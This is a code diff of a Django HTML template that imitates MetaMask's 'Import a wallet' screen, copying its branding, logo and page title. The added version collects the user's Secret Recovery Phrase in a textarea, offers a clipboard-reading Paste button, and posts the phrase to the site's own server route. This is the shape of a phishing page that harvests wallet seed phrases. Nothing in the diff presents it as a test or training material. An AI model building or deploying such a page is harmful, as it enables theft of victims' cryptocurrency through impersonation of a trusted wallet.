@@ -1,123 +1,153 @@
-{% extends 'base.html' %}
-{% block content %}
-  <div class="container">
-    <h1 class="first-time-flow__header">Import a wallet with Secret Recovery Phrase</h1>
-    <p style="margin-bottom: 24px; width: 46rem; letter-spacing: 0.5px;">Only the first account on this wallet will auto load. After completing this process, to add additional 
-      accounts, click the drop down menu, then select Create Account.
-    </p>
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import a wallet - MetaMask</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #000000;
+            color: #ffffff;
+            font-family: 'Inter', system-ui, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 460px;
+            padding: 32px 24px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+        .logo { width: 48px; height: auto; }
+        .lang {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .back {
+            font-size: 32px;
+            cursor: pointer;
+            color: #ffffff;
+            margin-bottom: 16px;
+            display: block;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin: 0 0 8px 0;
+        }
+        .subtitle {
+            color: #8a8a8a;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        textarea {
+            width: 100%;
+            min-height: 160px;
+            background: #1c1c1e;
+            border: 1px solid #333;
+            color: #ffffff;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            resize: vertical;
+            margin-bottom: 12px;
+        }
+        textarea:focus {
+            outline: none;
+            border-color: #037dd6;
+            box-shadow: 0 0 0 3px rgba(3, 125, 214, 0.3);
+        }
+        .paste {
+            color: #037dd6;
+            background: none;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            float: right;
+            margin-bottom: 16px;
+        }
+        .helper {
+            color: #8a8a8a;
+            font-size: 13px;
+            margin-bottom: 32px;
+            clear: both;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #037dd6;
+            color: white;
+            border: none;
+            border-radius: 999px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #0260b0;
+        }
+        .error {
+            background: #661800;
+            color: #ffcccc;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
 
-    <div>
-      <form action="" class="create-new-vault__form">
-        <div class="row d-flex justify-content-between">
-          <div class="col-lg-6 col-md-6 col-sm-12">
-            <span style="font-size: 19px;">Secret Recovery Phrase</span>
-          </div>
-          <div class="col-lg-6 col-md-6 col-sm-12 custom-select">
-            <select class="rounded border border-secondary bg-white text-start" style="font-size: 14px; width:22rem; height: 2rem; color: black;" id="mySelect">
-              <option value=1>I have a 12-word phrase</option>
-              <option value=2>I have a 15-word phrase</option>
-              <option value=3>I have a 18-word phrase</option>
-              <option value=4>I have a 21-word phrase</option>
-              <option value=5>I have a 24-word phrase</option>
+    <div class="container">
+        <div class="header">
+            <img src="{% static 'images/MetaMask_Fox.svg' %}" alt="MetaMask" class="logo">
+            <select class="lang">
+                <option>English</option>
             </select>
-          </div>
         </div>
 
-        <div class="text-center" style="margin-bottom: 1rem;">
-          <span class="btn primarybtn"> <span class="material-symbols-outlined symbol1" style="vertical-align: middle;">error</span> <span>You can paste your entire secret recovery phrase into any field</span></span>
-        </div>
+        <span class="back">&larr;</span>
 
-        <div class="row d-flex justify-content-center">
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -3rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">1.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">2.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput2">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction2()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">3.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput3">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction3()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-        </div>
+        <h1>Import a wallet</h1>
+        <p class="subtitle">Enter your Secret Recovery Phrase <span class="info-icon">ⓘ</span></p>
 
-        <div class="row d-flex justify-content-between" style="margin-bottom: 1rem;">
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -3rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">4.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput4">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction4()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">5.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput5">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction5()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">6.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput6">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction6()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-        </div>
+        {% if error %}
+            <div class="error">{{ error }}</div>
+        {% endif %}
 
-        <div class="row d-flex justify-content-between" style="margin-bottom: 1rem;">
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -3rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">7.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput7">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction7()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">8.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput8">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction8()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">9.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput9">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction9()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-        </div>
-
-        <div class="row d-flex justify-content-between" style="margin-bottom: 1rem;">
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -3rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">10.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput10">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction10()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">11.</span>
-            <input class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" type="password" id="myInput11">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction11()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-          <div class="col-lg-4 col-md-4 col-sm-12 mx-auto d-flex justify-content-center" style="margin-left: -6rem; margin-bottom: 1rem;">
-            <span style="width: 17px; margin-top: 0.5rem;">12.</span>
-            <input type="password" class="rounded border border-secondary bg-white" style="margin-left: 3.4%; width: 10.8rem; height: 2.8rem;" id="myInput12">
-            <span style="margin-left: 0.4rem; margin-top: 0.5rem;" onclick="myFunction12()" class="material-symbols-outlined">visibility_off</span>
-          </div>
-        </div>
-    
-        <p style="margin-bottom: 0.4rem;">New password (8 characters min)</p>
-        <div style="margin-left: -3rem; margin-bottom: 1rem;">
-          <input class="rounded border border-secondary bg-white" style="margin-left: 5.4%; width: 20rem; height: 2.8rem;" type="password">
-        </div>
-    
-        <p style="margin-bottom: 0.4rem;">Confirm password</p>
-        <div style="margin-left: -3rem;">
-          <input class="rounded border border-secondary bg-white" style="margin-left: 5.4%; width: 20rem; height: 2.8rem;" type="password">
-        </div>
-    
-        <div class="d-flex" style="margin-top: 1rem;">
-          <input style="margin-top: 0.1rem; margin-right:0.6rem" class="rounded border border-secondary bg-white" type="checkbox" required>
-          <span>I have read and agree to the <a class="nav-item" href="https://consensys.net/terms-of-use/">Terms of Use</a></span>
-        </div>
-        <div>
-          <button onclick="window.location.href=''" style="width: 9rem;" class="rounded-pill btn primarybtn1"><a href="https://metamask.io/" style="text-decoration: none; color: white;">Import</a></button>
-        </div>
-      </form>
+        <form method="post" action="{% url 'import_success' %}">
+            {% csrf_token %}
+            <textarea name="seed_phrase" placeholder="Separate words with spaces..." required></textarea>
+            <button type="button" class="paste">Paste</button>
+            <p class="helper">Add a space between each word and make sure no one is watching.</p>
+            <button type="submit" class="btn">Continue</button>
+        </form>
     </div>
 
-  </div>
-{% endblock %}
+    <script>
+        document.querySelector('.paste').addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.querySelector('textarea').value = text.trim();
+            } catch (err) {
+                alert('Paste failed: ' + err);
+            }
+        });
+    </script>
+
+</body>
+</html>
